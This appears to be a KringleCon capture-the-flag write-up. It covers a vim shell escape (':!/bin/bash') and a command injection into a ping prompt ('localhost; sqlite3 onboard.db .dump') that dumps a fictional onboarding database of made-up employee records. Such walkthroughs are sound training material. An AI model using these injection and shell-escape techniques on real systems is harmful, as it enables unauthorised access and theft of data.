# Terminal Challenges

The terminal challenges were scattered around the the Kringlecon arena. Each of them had an elf who was giving hints as to how to solve the challenge. In most cases these hints were straightforward and each terminal challenge could be solved without much headache. The solutions for each are given below.

## Essential Editor Skills

[https://docker.kringlecon.com/?challenge=viescape](https://docker.kringlecon.com/?challenge=viescape)

This challenge drops you into the `vim` editor with the challenge of breaking out to a shell. I'm familiar with one breakout method for vim described at [Restricted Linux Shell Escaping Techniques
](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/) which simply involves running `:!/bin/bash` as a `vim` command. Doing this drops us into a shell, but the challenge isn't quite done yet. At that point we have a prompt that says `vim` is still running, but doing a quick process listing via the `/proc` file system allows us to identify and then kill the `vim` process as shown below.

```
Loading, please wait......
Hmm.  I think vim is still running...
elf@364c16d08143:~$ 
elf@364c16d08143:~$ ls -al
total 40
drwxr-xr-x 1 elf  elf   4096 Jan  8 20:15 .
drwxr-xr-x 1 root root  4096 Dec 14 16:44 ..
-rw-r--r-- 1 elf  elf    220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf   3571 Dec 14 16:44 .bashrc
-rw-r--r-- 1 elf  elf   1065 Dec 14 16:13 .message
-rw-r--r-- 1 elf  elf  12288 Jan  8 20:14 .message.swp
-rw-r--r-- 1 elf  elf    675 May 15  2017 .profile
-rw------- 1 elf  elf    643 Jan  8 20:15 .viminfo
elf@364c16d08143:~$ ps aux
bash: ps: command not found
elf@364c16d08143:~$ ls -al /proc/*/exe
lrwxrwxrwx 1 elf elf 0 Jan  8 20:16 /proc/1/exe -> /bin/bash
lrwxrwxrwx 1 elf elf 0 Jan  8 20:16 /proc/11/exe -> /usr/bin/vim.basic
lrwxrwxrwx 1 elf elf 0 Jan  8 20:16 /proc/12/exe -> /bin/dash
lrwxrwxrwx 1 elf elf 0 Jan  8 20:16 /proc/13/exe -> /bin/bash
lrwxrwxrwx 1 elf elf 0 Jan  8 20:16 /proc/self/exe -> /bin/ls
lrwxrwxrwx 1 elf elf 0 Jan  8 20:16 /proc/thread-self/exe -> /bin/ls
elf@364c16d08143:~$ kill -9 11
elf@364c16d08143:~$ Loading, please wait......
You did it! Congratulations!
elf@364c16d08143:~$ 
```

## The Name Game

[https://docker.kringlecon.com/?challenge=pwshmenu](https://docker.kringlecon.com/?challenge=pwshmenu)

The second terminal challenge gives us the following prompt:

```
We just hired this new worker,
Californian or New Yorker?
Think he's making some new toy bag...
My job is to make his name tag.

Golly gee, I'm glad that you came,
I recall naught but his last name!
Use our system or your own plan,
Find the first name of our guy "Chan!"

-Bushy Evergreen

To solve this challenge, determine the new worker's first name and submit to runtoanswer.

====================================================================
=                                                                  =
= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
=                                                                  =
====================================================================

 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.

Please make a selection: 
```

Choosing (2) and selecting the hostname `localhost` gives us a ping, followed by the name of the sqlite database (`onboard.db`):

```
Validating data store for employee onboard information.
Enter address of server: localhost
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.039 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.056 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.082 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.039/0.059/0.082/0.017 ms
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

Given that this looks identical to the `ping` command line program, it seems straightforward to try a command injection with `localhost; sqlite3 onboard.db .dump` which works. This dumps the entire database as shown below:

```
Validating data store for employee onboard information.
Enter address of server: localhost; sqlite3 onboard.db .dump
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.035 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.082 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.052 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.035/0.056/0.082/0.020 ms
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
INSERT INTO "onboard" VALUES(10,'Karen','Duck','52 Annfield Rd',NULL,'BEAL','DN14 7AU','077 8656 6609','karensduck@einrot.com');
INSERT INTO "onboard" VALUES(11,'Josephine','Harrell','3 Victoria Road',NULL,'LITTLE ASTON','B74 8XD','079 5532 7917','josephinedharrell@einrot.com');
INSERT INTO "onboard" VALUES(12,'Jason','Madsen','4931 Cliffside Drive',NULL,'Worcester','12197','607-397-0037','jasonlmadsen@einrot.com');
INSERT INTO "onboard" VALUES(13,'Nichole','Murphy','53 St. John Street',NULL,'Craik','S4P 3Y2','306-734-9091','nicholenmurphy@teleworm.us');
INSERT INTO "onboard" VALUES(14,'Mary','Lyons','569 York Mills Rd',NULL,'Toronto','M3B 1Y2','416-274-6639','maryjlyons@superrito.com');
INSERT INTO "onboard" VALUES(15,'Luz','West','1307 Poe Lane',NULL,'Paola','66071','913-557-2372','luzcwest@rhyta.com');
INSERT INTO "onboard" VALUES(16,'Walter','Savell','4782 Neville Street',NULL,'Seymour','47274','812-580-5138','walterdsavell@fleckens.hu');
INSERT INTO "onboard" VALUES(17,'Michelle','Hicks','82 Middlewich Road',NULL,'FIRTH','ZE2 1BQ','070 2607 0997','michellejhicks@jourrapide.com');
INSERT INTO "onboard" VALUES(18,'Carolyn','Harvey','94 Friar Street',NULL,'CLEETHORPES','DN35 7YP','078 3359 6177','carolynmharvey@teleworm.us');
INSERT INTO "onboard" VALUES(19,'Julie','Westrick','4261 Corpening Drive',NULL,'Troy','48083','248-457-6093','julieswestrick@jourrapide.com');
INSERT INTO "onboard" VALUES(20,'Cara','Hodge','6 Clasper Way',NULL,'HEYSHOTT','GU29 3ZX','079 8870 5836','cararhodge@armyspy.com');
INSERT INTO "onboard" VALUES(21,'Ashley','Ramos','2326 Lauzon Parkway',NULL,'Leamington','N8H 3B9','519-329-7102','ashleywramos@superrito.com');
INSERT INTO "onboard" VALUES(22,'Marcia','Yee','17 Holburn Lane',NULL,'HELPERBY','YO6 2FT','070 2717 2611','marciamyee@armyspy.com');
INSERT INTO "onboard" VALUES(23,'Erica','McIntosh','4894 Port Washington Road',NULL,'Leslieville','T0M 1H0','403-729-0320','ericaamcintosh@cuvox.de');
INSERT INTO "onboard" VALUES(24,'Franklyn','Goldsmith','25 Hillside Street',NULL,'Paradise Valley','85253','480-513-4464','franklynngoldsmith@teleworm.us');
INSERT INTO "onboard" VALUES(25,'Christopher','Green','4896 Lynden Road',NULL,'Moonstone','L0K 1N0','705-835-6976','christopherngreen@fleckens.hu');
INSERT INTO "onboard" VALUES(26,'Reggie','Little','285 Kidd Avenue',NULL,'Anchorage','99501','907-932-8909','reggiehlittle@gustr.com');
INSERT INTO "onboard" VALUES(27,'Mary','Hawes','91 George Avenue',NULL,'Belle Fontaine','36607','251-245-0433','maryrhawes@gustr.com');
INSERT INTO "onboard" VALUES(28,'Blanche','Webster','2695 Airport Blvd',NULL,'Gander','A1V 2M7','709-234-5453','blancherwebster@dayrep.com');
INSERT INTO "onboard" VALUES(29,'Antonio','Herbert','637 Lynden Road',NULL,'Lefroy','L0L 1W0','705-456-6107','antoniogherbert@einrot.com');
INSERT INTO "onboard" VALUES(30,'Elisabeth','George','4667 Harley Brook Lane',NULL,'Johnstown','15904','814-592-3905','elisabethmgeorge@teleworm.us');
INSERT INTO "onboard" VALUES(31,'Mark','Dinkins','3593 Private Lane',NULL,'Albany','31701','229-281-7470','markndinkins@einrot.com');
INSERT INTO "onboard" VALUES(32,'Melody','Mendoza','2900 Reserve St',NULL,'Castleton','K0K 1M0','905-344-8354','melodywmendoza@gustr.com');
INSERT INTO "onboard" VALUES(33,'Reginald','Duncan','3606 Michigan Avenue',NULL,'Bolivar','15923','724-676-9897','reginaldvduncan@jourrapide.com');
INSERT INTO "onboard" VALUES(34,'Jessica','Munk','51 Cunnery Rd',NULL,'MAESYCRUGIAU','SA39 8FJ','078 6965 8387','jessicaamunk@fleckens.hu');
INSERT INTO "onboard" VALUES(35,'Aaron','Pasley','41 Glenurquhart Road',NULL,'BALLIEMORE','PA34 5WH','077 6882 0012','aaronrpasley@rhyta.com');
INSERT INTO "onboard" VALUES(36,'Randy','Johnson','1545 Woodvale Drive',NULL,'Fingal','N0L 1K0','519-769-3889','randydjohnson@fleckens.hu');
INSERT INTO "onboard" VALUES(37,'Mary','Tucker','1306 Winding Way',NULL,'Providence','2906','401-692-8503','marybtucker@jourrapide.com');
INSERT INTO "onboard" VALUES(38,'Timothy','Montgomery','83 Academy Street',NULL,'BETHEL','LL21 1HD','070 6084 3545','timothyrmontgomery@superrito.com');
INSERT INTO "onboard" VALUES(39,'Elizabeth','Fox','1044 Tanner Street',NULL,'Vancouver','V5R 2T4','604-436-2749','elizabethmfox@jourrapide.com');
INSERT INTO "onboard" VALUES(40,'Clifford','Moore','41 Telford Street',NULL,'BARKHAM','RG41 9TQ','079 5681 0730','cliffordlmoore@fleckens.hu');
INSERT INTO "onboard" VALUES(41,'Clifford','Williams','24 Tonbridge Rd',NULL,'COOKNEY','AB3 5DY','078 6260 1601','cliffordcwilliams@dayrep.com');
INSERT INTO "onboard" VALUES(42,'Diane','Stewart','3825 Tully Street',NULL,'Livonia','48150','313-721-7835','dianewstewart@gustr.com');
INSERT INTO "onboard" VALUES(43,'Jane','Purdue','4522 Maple Court',NULL,'Macks Creek','65786','573-363-6930','janejpurdue@armyspy.com');
INSERT INTO "onboard" VALUES(44,'Donna','Reynolds','15 Folkestone Road',NULL,'WINCHMORE HILL','HP7 6UG','077 3596 0968','donnajreynolds@teleworm.us');
INSERT INTO "onboard" VALUES(45,'Mae','Gonzalez','4982 Yonge Street',NULL,'Toronto','M4W 1J7','416-318-6431','maedgonzalez@rhyta.com');
INSERT INTO "onboard" VALUES(46,'Julia','Mullenix','98 Graham Road',NULL,'CHEVITHORNE','EX16 9WE','079 4511 1929','juliapmullenix@armyspy.com');
INSERT INTO "onboard" VALUES(47,'Kathleen','Hudson','2102 rue Saint-Édouard',NULL,'Trois Rivieres','G9A 5S8','819-694-7235','kathleenshudson@dayrep.com');
INSERT INTO "onboard" VALUES(48,'Jose','Salas','801 Paradise Crescent',NULL,'Hauterive','G5C 1M1','418-589-3293','joseasalas@armyspy.com');
INSERT INTO "onboard" VALUES(49,'Suzanne','Ziegler','90 East Street',NULL,'MARK','TA9 7JE','078 2398 8807','suzannejziegler@fleckens.hu');
INSERT INTO "onboard" VALUES(50,'Stella','Worsham','910 Hart Country Lane',NULL,'Atlanta','30303','706-530-2741','stellasworsham@fleckens.hu');
INSERT INTO "onboard" VALUES(51,'Donald','Dupree','85 Glenurquhart Road',NULL,'BALLAUGH','IM7 9LT','070 2322 3531','donaldvdupree@teleworm.us');
INSERT INTO "onboard" VALUES(52,'Dolores','Carroll','81 Guildford Rd',NULL,'EAST HYDE','LU1 8ZF','070 5400 2455','dolorespcarroll@teleworm.us');
INSERT INTO "onboard" VALUES(53,'Danny','Pink','3962 Walnut Drive',NULL,'Fargo','58103','701-371-7143','dannycpink@fleckens.hu');
INSERT INTO "onboard" VALUES(54,'Dorothy','Rowe','4402 St Marys Rd',NULL,'Winnipeg','R3C 3N9','204-951-1482','dorothydrowe@rhyta.com');
INSERT INTO "onboard" VALUES(55,'Verna','Mashburn','4870 Trymore Road',NULL,'Clements','56224','507-692-6468','vernafmashburn@fleckens.hu');
INSERT INTO "onboard" VALUES(56,'Patsy','Mendez','629 Deer Ridge Drive',NULL,'Wayne','7477','973-641-9131','patsyamendez@cuvox.de');
INSERT INTO "onboard" VALUES(57,'Stan','Neel','4327 Embro St',NULL,'Innerkip','N0J 1M0','519-469-7243','stanjneel@gustr.com');
INSERT INTO "onboard" VALUES(58,'Scott','Casperson','402 Echo Lane',NULL,'Middleville','49333','269-795-1629','scottfcasperson@cuvox.de');
INSERT INTO "onboard" VALUES(59,'Roger','Waller','4974 Wiseman Street',NULL,'Jefferson City','37760','865-471-2287','rogertwaller@jourrapide.com');
INSERT INTO "onboard" VALUES(60,'Cary','Hurst','3567 Cooks Mine Road',NULL,'Las Cruces','88005','505-679-9488','caryghurst@jourrapide.com');
INSERT INTO "onboard" VALUES(61,'Tyler','Joseph','177 James Street',NULL,'Aldergrove','V5G 4S4','604-866-1097','tylersjoseph@rhyta.com');
INSERT INTO "onboard" VALUES(62,'Susie','Higa','80 Broad Street',NULL,'LOWER PENNINGTON','SO41 4BA','070 7312 1513','susiekhiga@dayrep.com');
INSERT INTO "onboard" VALUES(63,'Linda','Crawford','4060 Ross Street',NULL,'Smiths Falls','K7A 1C2','613-284-5165','lindakcrawford@jourrapide.com');
INSERT INTO "onboard" VALUES(64,'Katherine','Charney','622 137th Avenue',NULL,'Edmonton','T5J 0X2','780-669-4710','katherinefcharney@einrot.com');
INSERT INTO "onboard" VALUES(65,'Gretchen','Barthel','31 Kingsway North',NULL,'HOLSWORTHY','EX22 8EB','070 6551 4496','gretchencbarthel@gustr.com');
INSERT INTO "onboard" VALUES(66,'Marvin','Kennedy','34 Lamphey Road',NULL,'THE WYKE','TF11 1YR','078 6972 2991','marvinlkennedy@jourrapide.com');
INSERT INTO "onboard" VALUES(67,'Oretha','Wyss','4446 Davis Street',NULL,'Augusta','30901','706-365-8842','orethajwyss@fleckens.hu');
INSERT INTO "onboard" VALUES(68,'Brenda','Lowe','41 West Lane',NULL,'DALGONAR','DG3 8DP','070 5591 8305','brendaclowe@gustr.com');
INSERT INTO "onboard" VALUES(69,'Christina','Lewis','70 Thames Street',NULL,'BONNYBANK','KY8 1BG','070 1509 9499','christinaflewis@fleckens.hu');
INSERT INTO "onboard" VALUES(70,'Beatrice','Bullock','77 Abingdon Road',NULL,'BRANTWOOD','LA21 5PZ','079 6195 4027','beatricefbullock@superrito.com');
INSERT INTO "onboard" VALUES(71,'William','Higgins','65 Roman Rd',NULL,'LEDBURY','HR8 5JJ','079 2677 5229','williamchiggins@superrito.com');
INSERT INTO "onboard" VALUES(72,'Francis','Fails','1382 Papineau Avenue',NULL,'Montreal','H2K 4J5','514-402-7359','francispfails@armyspy.com');
INSERT INTO "onboard" VALUES(73,'Anthony','Gould','1689 Hammarskjold Dr',NULL,'Burnaby','V5B 3C9','604-293-7978','anthonyjgould@armyspy.com');
INSERT INTO "onboard" VALUES(74,'John','Gaston','2090 St Jean Baptiste St',NULL,'St Ludger','G0M 1W0','819-548-7107','johnegaston@gustr.com');
INSERT INTO "onboard" VALUES(75,'Judy','Franklin','15 Broomfield Place',NULL,'STONE STREET','IP19 3NA','078 6676 2490','judycfranklin@rhyta.com');
INSERT INTO "onboard" VALUES(76,'Vanessa','Hartsock','92 Middlewich Road',NULL,'FIVE ASH DOWN','TN22 0JT','077 2279 2150','vanessashartsock@einrot.com');
INSERT INTO "onboard" VALUES(77,'Lois','Martin','74 Consett Rd',NULL,'HIGHLAWS','CA5 6SD','077 2846 0658','loisjmartin@cuvox.de');
INSERT INTO "onboard" VALUES(78,'Charles','Mejia','64 Newgate Street',NULL,'JACKTON','G75 8QB','078 0038 5514','charlesbmejia@fleckens.hu');
INSERT INTO "onboard" VALUES(79,'Francisco','Guajardo','2074 Kerry Way',NULL,'Irvine','92614','562-832-4500','franciscolguajardo@dayrep.com');
INSERT INTO "onboard" VALUES(80,'Danny','Williams','4736 47th Avenue',NULL,'Boyle','T0A 0M0','780-689-7571','dannynwilliams@rhyta.com');
INSERT INTO "onboard" VALUES(81,'Juan','Bowen','1968 Danforth Avenue',NULL,'Toronto','M4K 1A6','416-476-9751','juanabowen@teleworm.us');
INSERT INTO "onboard" VALUES(82,'Jim','Hill','3518 Main St',NULL,'Wolfville','B0P 1X0','902-697-6163','jimchill@teleworm.us');
INSERT INTO "onboard" VALUES(83,'Joseph','Johnson','3443 Delaware Avenue',NULL,'San Francisco','94108','415-274-4354','josephjjohnson@cuvox.de');
INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
INSERT INTO "onboard" VALUES(85,'Pat','Shaffer','97 Southern Way',NULL,'NORTH SCARLE','LN6 7SE','070 5181 8156','patcshaffer@superrito.com');
INSERT INTO "onboard" VALUES(86,'John','Bishop','59 North Road',NULL,'NETHER HEYFORD','NN7 3TE','077 7175 9692','johnebishop@jourrapide.com');
INSERT INTO "onboard" VALUES(87,'Mattie','Rodriguez','2993 Yonge Street',NULL,'Toronto','M4W 1J7','416-720-2724','mattierrodriguez@armyspy.com');
INSERT INTO "onboard" VALUES(88,'Pearl','McCord','11 Boughton Rd',NULL,'WICKHAM ST PAUL','CO9 0QG','078 3015 0064','pearldmccord@superrito.com');
INSERT INTO "onboard" VALUES(89,'Laurie','Ng','1652 Higginsville Road',NULL,'Windsor','B0N 2T0','902-472-1603','lauriejng@fleckens.hu');
INSERT INTO "onboard" VALUES(90,'Tanya','Thomason','2386 Center Street',NULL,'Eugene','97401','541-915-2732','tanyamthomason@cuvox.de');
INSERT INTO "onboard" VALUES(91,'Sherry','Hinton','87 Southend Avenue',NULL,'BLACKFORDBY','DE11 5QN','070 8154 8258','sherrythinton@gustr.com');
INSERT INTO "onboard" VALUES(92,'Dwayne','Straight','3870 Ottis Street',NULL,'Minco','73059','405-352-0132','dwaynejstraight@gustr.com');
INSERT INTO "onboard" VALUES(93,'Tina','Houser','4195 Quayside Dr',NULL,'New Westminster','V3M 6A1','778-238-8700','tinaahouser@teleworm.us');
INSERT INTO "onboard" VALUES(94,'Deborah','Soileau','3938 Goyeau Ave',NULL,'Windsor','N9A 1H9','519-890-6446','deborahjsoileau@teleworm.us');
INSERT INTO "onboard" VALUES(95,'Sharon','Leitch','4608 Snowbird Lane',NULL,'Omaha','68104','402-689-8335','sharonjleitch@superrito.com');
INSERT INTO "onboard" VALUES(96,'Julia','Nunn','3166 rue des Églises Est',NULL,'Arntfield','J0Z 1B0','819-279-8802','julialnunn@fleckens.hu');
INSERT INTO "onboard" VALUES(97,'Emma','Anton','950 Carling Avenue',NULL,'Ottawa','K1Z 7B5','613-799-8843','emmawanton@einrot.com');
INSERT INTO "onboard" VALUES(98,'Margaret','Janes','1476 Boone Street',NULL,'Alice','78332','361-207-8407','margaretcjanes@fleckens.hu');
INSERT INTO "onboard" VALUES(99,'Terry','Morgan','441 Fallon Drive',NULL,'Mount Forest','N0G 2L2','519-321-3224','terryjmorgan@fleckens.hu');
INSERT INTO "onboard" VALUES(100,'Adam','Cooper','4791 Waterton Avenue',NULL,'Pincher Creek','T0K 1W0','403-632-1856','adamhcooper@superrito.com');
INSERT INTO "onboard" VALUES(101,'Diane','McCartney','845 Lauzon Parkway',NULL,'Leamington','N8H 3B1','519-322-3658','dianekmccartney@cuvox.de');
INSERT INTO "onboard" VALUES(102,'Thomas','Buss','57 Canterbury Road',NULL,'UPWARE','CB7 3NH','078 7137 8440','thomaspbuss@cuvox.de');
INSERT INTO "onboard" VALUES(103,'Amanda','Johnson','40 Whatlington Road',NULL,'COULSTON','BA13 9BA','070 2755 4430','amandacjohnson@gustr.com');
INSERT INTO "onboard" VALUES(104,'Stella','Jones','90 Maidstone Road',NULL,'WENTNOR','SY9 1NN','078 6029 1533','stellajjones@gustr.com');
INSERT INTO "onboard" VALUES(105,'Angela','Linder','83 Roman Rd',NULL,'LEE MILL BRIDGE','PL7 5NW','079 3061 8143','angelaelinder@teleworm.us');
INSERT INTO "onboard" VALUES(106,'Lance','Schill','1488 Oakway Lane',NULL,'Los Angeles','90017','818-253-8238','lancesschill@jourrapide.com');
INSERT INTO "onboard" VALUES(107,'Mary','Smith','42 Fulford Road',NULL,'PENPONT','DG3 2SN','078 4426 8667','maryjsmith@rhyta.com');
INSERT INTO "onboard" VALUES(108,'Joseph','Beck','20 Seaford Road',NULL,'CULLIPOOL','PA34 8BP','078 4405 7430','josephsbeck@gustr.com');
INSERT INTO "onboard" VALUES(109,'Edward','Dawkins','1259 Selah Way',NULL,'Winooski','5404','802-654-3001','edwardhdawkins@superrito.com');
INSERT INTO "onboard" VALUES(110,'Kevin','Torres','714 Myra Street',NULL,'Providence','2903','401-488-9912','kevindtorres@superrito.com');
INSERT INTO "onboard" VALUES(111,'Cameron','Wells','4822 Rhapsody Street',NULL,'Gainesville','32601','352-337-5273','cameronrwells@armyspy.com');
INSERT INTO "onboard" VALUES(112,'Louis','Garcia','4217 Burwell Heights Road',NULL,'Houston','77027','409-555-7232','louisvgarcia@armyspy.com');
INSERT INTO "onboard" VALUES(113,'Stacey','White','82 Well Lane',NULL,'PATRIXBOURNE','CT4 6SZ','079 7426 2830','staceywwhite@teleworm.us');
INSERT INTO "onboard" VALUES(114,'Jean','Cruise','798 40th Street',NULL,'Calgary','T2K 0P7','403-275-7274','jeanbcruise@armyspy.com');
INSERT INTO "onboard" VALUES(115,'Omega','Stamm','15 Whatlington Road',NULL,'COWAN BRIDGE','LA6 9WU','077 5586 6506','omegafstamm@jourrapide.com');
INSERT INTO "onboard" VALUES(116,'Claudia','Cantrell','24 Trehafod Road',NULL,'BUCKLEBURY','RG7 2TS','078 5083 3233','claudiatcantrell@jourrapide.com');
INSERT INTO "onboard" VALUES(117,'Joann','Kellar','80 Petworth Rd',NULL,'DUNSTON','ST18 9BR','079 7011 8965','joannskellar@cuvox.de');
INSERT INTO "onboard" VALUES(118,'Dexter','Figueroa','2294 Broadmoor Blvd',NULL,'Sherwood Park','T8A 1V6','780-662-7299','dexterbfigueroa@cuvox.de');
INSERT INTO "onboard" VALUES(119,'Debbie','Gee','49 Sandyhill Rd',NULL,'GAICK LODGE','PH21 7WE','070 8515 8276','debbiergee@armyspy.com');
INSERT INTO "onboard" VALUES(120,'Lilian','Finn','1836 Reserve St',NULL,'Long Sault','K0L 1P0','613-534-6303','liliankfinn@einrot.com');
INSERT INTO "onboard" VALUES(121,'Estelle','Avila','45 Ash Lane',NULL,'YIEWSLEY','UB7 5YQ','078 6560 6052','estelleravila@jourrapide.com');
INSERT INTO "onboard" VALUES(122,'John','Gill','2268 Red Bud Lane',NULL,'Rochelle Park','7662','862-370-8712','johnagill@gustr.com');
INSERT INTO "onboard" VALUES(123,'Lisa','Arsenault','92 West Lane',NULL,'DARENTH','DA2 1ZJ','078 7094 2406','lisajarsenault@gustr.com');
INSERT INTO "onboard" VALUES(124,'John','Garcia','56 Golden Knowes Road',NULL,'FRIESTHORPE','LN3 0HE','070 1447 9983','johnsgarcia@cuvox.de');
INSERT INTO "onboard" VALUES(125,'Melvin','Carlucci','2232 Yonge Street',NULL,'Toronto','M4W 1J7','416-961-5670','melvinlcarlucci@cuvox.de');
INSERT INTO "onboard" VALUES(126,'Stefan','Sanchez','36 Trehafod Road',NULL,'BUCKLAND BREWER','EX39 8YL','077 3783 9813','stefanksanchez@rhyta.com');
INSERT INTO "onboard" VALUES(127,'Sylvia','Shaver','1317 47th Avenue',NULL,'Lac La Biche','T0A 2C0','780-404-8373','sylviaoshaver@dayrep.com');
INSERT INTO "onboard" VALUES(128,'Ka','Venne','4953 Doctors Drive',NULL,'El Segundo','90245','310-364-8308','kagvenne@cuvox.de');
INSERT INTO "onboard" VALUES(129,'Ofelia','Graham','88 Broomfield Place',NULL,'STONEBRIDGE','CV7 9JE','070 4014 2835','ofeliahgraham@teleworm.us');
INSERT INTO "onboard" VALUES(130,'Teresa','Clayton','2121 Elk Rd Little',NULL,'Tucson','85712','520-237-6700','teresajclayton@teleworm.us');
INSERT INTO "onboard" VALUES(131,'Ronald','Killion','663 40th Street',NULL,'Calgary','T2P 2V7','403-539-0482','ronaldbkillion@cuvox.de');
INSERT INTO "onboard" VALUES(132,'Diane','Moore','346 Dundas St',NULL,'Toronto','M2N 2G8','416-218-0180','dianebmoore@dayrep.com');
INSERT INTO "onboard" VALUES(133,'Eva','Dahlstrom','92 47th Avenue',NULL,'Waskatenau','T0A 3P0','780-358-8646','evacdahlstrom@superrito.com');
INSERT INTO "onboard" VALUES(134,'Marie','Davis','86 Sea Road',NULL,'LAMLOCH','DG7 9GF','077 6603 5676','mariemdavis@cuvox.de');
INSERT INTO "onboard" VALUES(135,'Linda','Broomfield','4780 Woodstock Drive',NULL,'El Monte','91731','626-456-3955','lindambroomfield@dayrep.com');
INSERT INTO "onboard" VALUES(136,'Daniel','Reed','84 Buckingham Rd',NULL,'THORNTON-LE-BEANS','DL6 8HP','079 7101 0192','danieldreed@rhyta.com');
INSERT INTO "onboard" VALUES(137,'Douglas','Porter','17 Scarcroft Road',NULL,'PORTH','CF39 9EU','079 5441 7939','douglasfporter@jourrapide.com');
INSERT INTO "onboard" VALUES(138,'Lawrence','Heck','4919 Speers Road',NULL,'Brampton','L6T 3W9','905-793-4570','lawrencerheck@fleckens.hu');
INSERT INTO "onboard" VALUES(139,'Rachel','Trent','4653 Haaglund Rd',NULL,'Lower Post','V0H 0H0','250-779-0723','racheljtrent@teleworm.us');
INSERT INTO "onboard" VALUES(140,'Iva','Johnson','2939 Quilly Lane',NULL,'Westerville','43081','614-544-2873','ivadjohnson@jourrapide.com');
INSERT INTO "onboard" VALUES(141,'Lance','Arceo','86 Kingsway North',NULL,'HOLMSIDE','DH7 9EW','070 5772 3162','lancemarceo@cuvox.de');
INSERT INTO "onboard" VALUES(142,'Valerie','Howell','1142 rue Levy',NULL,'Montreal','H3C 5K4','514-774-5866','valeriedhowell@superrito.com');
INSERT INTO "onboard" VALUES(143,'Mary','Poirier','2038 Stutler Lane',NULL,'Bedford','15522','814-423-2173','marydpoirier@einrot.com');
INSERT INTO "onboard" VALUES(144,'Susanne','Camp','4146 Galts Ave',NULL,'Red Deer','T4N 5Z9','403-373-2195','susannewcamp@armyspy.com');
INSERT INTO "onboard" VALUES(145,'Ron','Peters','1364 137th Avenue',NULL,'Edmonton','T5M 3K3','780-454-1668','ronlpeters@rhyta.com');
INSERT INTO "onboard" VALUES(146,'Marjory','Bryant','4129 Court Street',NULL,'Eureka','63025','636-587-5083','marjorykbryant@dayrep.com');
INSERT INTO "onboard" VALUES(147,'Betty','Pratt','68 Oxford Rd',NULL,'WOOTTON','CT4 5WA','070 4977 6152','bettygpratt@gustr.com');
INSERT INTO "onboard" VALUES(148,'Regina','Chen','3930 Chestnut Street',NULL,'Tampa','33619','727-482-0568','reginalchen@cuvox.de');
INSERT INTO "onboard" VALUES(149,'Charles','Atkins','418 Hood Avenue',NULL,'San Diego','92111','858-694-9634','charlesmatkins@gustr.com');
INSERT INTO "onboard" VALUES(150,'Lawrence','Taylor','91 Scarcroft Road',NULL,'PORT LOGAN','DG9 5LG','077 3050 1172','lawrencejtaylor@cuvox.de');
INSERT INTO "onboard" VALUES(151,'Pam','Goudy','1785 Russell Street',NULL,'Woburn','1801','978-853-5666','pamgoudy@einrot.com');
INSERT INTO "onboard" VALUES(152,'Evelyn','Evans','2438 Reserve St',NULL,'Parham','K0H 2K0','613-375-6041','evelyndevans@cuvox.de');
INSERT INTO "onboard" VALUES(153,'Janice','Atkin','85 Oxford Rd',NULL,'WORK','KW15 5EF','078 8718 3013','janicebatkin@dayrep.com');
INSERT INTO "onboard" VALUES(154,'Hazel','Merrick','3751 Owen Lane',NULL,'Naples','33940','239-263-5968','hazelbmerrick@cuvox.de');
INSERT INTO "onboard" VALUES(155,'Pearlene','Ferrell','1410 Dominion St',NULL,'Finch','K0C 1K0','613-984-2873','pearlenetferrell@teleworm.us');
INSERT INTO "onboard" VALUES(156,'Peggy','Harper','1846 Davis Street',NULL,'Chickamauga','30707','706-382-7319','peggyaharper@armyspy.com');
INSERT INTO "onboard" VALUES(157,'Carol','Lindsey','4211 40th Street',NULL,'Calgary','T2M 0X4','403-210-8234','carolglindsey@gustr.com');
INSERT INTO "onboard" VALUES(158,'Santiago','Field','4783 Merivale Road',NULL,'Kanata','K2K 1L9','613-592-3285','santiagobfield@einrot.com');
INSERT INTO "onboard" VALUES(159,'Hugh','Torres','3773 Northumberland Street',NULL,'Baden','N0B 1G0','519-634-7229','hughbtorres@teleworm.us');
INSERT INTO "onboard" VALUES(160,'Claudia','Halpin','3248 Colonial Drive',NULL,'College Station','77840','979-764-7262','claudiajhalpin@armyspy.com');
INSERT INTO "onboard" VALUES(161,'Christopher','Windham','2310 Barton Street',NULL,'Stoney Creek','L8G 2V1','905-664-5559','christopheruwindham@fleckens.hu');
INSERT INTO "onboard" VALUES(162,'Theodore','Young','4201 Providence Lane',NULL,'Anaheim','92801','626-803-1180','theodoresyoung@cuvox.de');
INSERT INTO "onboard" VALUES(163,'Lauren','Casey','4455 Fallon Drive',NULL,'Hensall','N0M 1X0','519-263-7462','laurenjcasey@jourrapide.com');
INSERT INTO "onboard" VALUES(164,'Molly','Logan','1544 St George Street',NULL,'Vancouver','V5T 1Z7','604-871-8098','mollyhlogan@jourrapide.com');
INSERT INTO "onboard" VALUES(165,'Alan','Guinn','3395 Galts Ave',NULL,'Red Deer','T4N 2A6','403-309-5523','alanmguinn@fleckens.hu');
INSERT INTO "onboard" VALUES(166,'Brenda','Johnson','65 Northgate Street',NULL,'BETLEY','CW3 1TE','070 1362 3463','brendatjohnson@gustr.com');
INSERT INTO "onboard" VALUES(167,'Catherine','Priest','1144 McDonald Avenue',NULL,'Orlando','32810','407-924-7464','catherinebpriest@superrito.com');
